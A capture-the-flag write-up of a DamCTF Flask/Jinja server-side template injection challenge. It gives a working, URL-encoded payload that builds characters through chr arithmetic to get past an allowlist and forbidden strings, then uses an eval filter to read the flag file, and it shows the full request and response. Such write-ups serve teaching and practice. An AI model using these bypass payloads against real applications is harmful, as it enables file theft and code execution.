# Secure Translation - flask/jinja SSTI Challange
*Overall fun and sweaty web challenge that took more time then anticipated*  
**Difficulty: 7/10**
## RECON
The web server was running a flask/jinja application that had the following routes:
```
@server.route("/") => app.py 
@server.route("/<path>") => app.py if the resource is nonexistent
@server.route("/secure_translate/") => print(f"Payload parsed: {payload}") - payload parameter is user controlled input. Vulnerable to SSTI.
```
- The Docker file showed that all the source files are located in the web root, so we could access them by simply navigating to - http://webapp/source.py
  
  
The application had a list of characters that are allowed to use for a payload:
```
allowList = ["b", "c", "d", "e", "h", "l", "o", "r", "u", "1", "4", "6", "*", "(", ")", "-", "+", "'", "|", "{", "}"]
```
Using a character that is not in this list would reutrn:
```
Failed Allowlist Check: <all the blacklisted characters that you used>
```
The application also had custom jinja filters:
```
app.jinja_env.filters["u"] = up --> uppercase
app.jinja_env.filters["l"] = low --> lowercase
app.jinja_env.filters["b64d"] = b64dec  --> base64 decode
app.jinja_env.filters["order"] = sortr  --> sort string
app.jinja_env.filters["ch"] = ch  --> return character from character code
app.jinja_env.filters["e"] = e  --> eval
```
Reference: https://jinja.palletsprojects.com/en/3.0.x/templates/#filters
## EXPLOITATION
  
1. **Expanding our dictionary**
  
Using only the whitelisted characters is not enough to build a high severity payload, so we had to expand our alphabet by using basic arithmetics and the jinja filters for string transformation
  
The 'ch' filter uses python's chr(int) function to return a character based on the ascii number.  
```
>>> print(chr(111-14))
>>> a
.
.
.
GET http://webapp/secure_translate/payload={{(111-14)|ch}}
<html>
a
</html>
```
*Note that we can only use the numbers 1, 4, 6 from the allowlist*  

Now that we can use all the characters we can generate more complex payloads and pass them to eval
  
  
2. **More blacklisted strings**  
  
The filters.py file adds another layer of filtration by blacklisting some strings that are passed to eval:
```
forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]
```
In addtion the first 4 characters cannot be "open" and "eval":
```
if x[0:4] == "open" or x[0:4] == "eval":
  return "Not That Easy ;)"
```
Honorable mention:  
- The input has a limit of 161 characters, otherwise it's rejected by the application.

3. **Final Exploit**  
  
Payload: 
```
\ropen('flag').read()
```
more commonly known as  
```
{{((6%2b6%2b1)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}}
```
  
Trace:
```
GET /secure_translate/?payload={{((6%2b6%2b1)|ch%2b'o'%2b(111%2b1)|ch%2b'e'%2b(111-1)|ch%2b'("'%2b(46%2b1)|ch%2b(61%2b41)|ch%2b'l'%2b(111-14)|ch%2b(61%2b41%2b1)|ch%2b'"'%2b')'%2b46|ch%2b're'%2b(111-14)|ch%2b'd()')|e}} HTTP/2
Host: super-secure-translation-implementation.chals.damctf.xyz
User-Agent: MozSSilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
.
.
.
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 08 Nov 2021 00:55:30 GMT
Server: gunicorn
Content-Length: 744

<!doctype html>
<stripped>
    <code>
      <p>dam{p4infu1_all0wl1st_w3ll_don3}
</p><a href="/">Take Me Home</a>
    </code>
  </stripped>
</html>
```
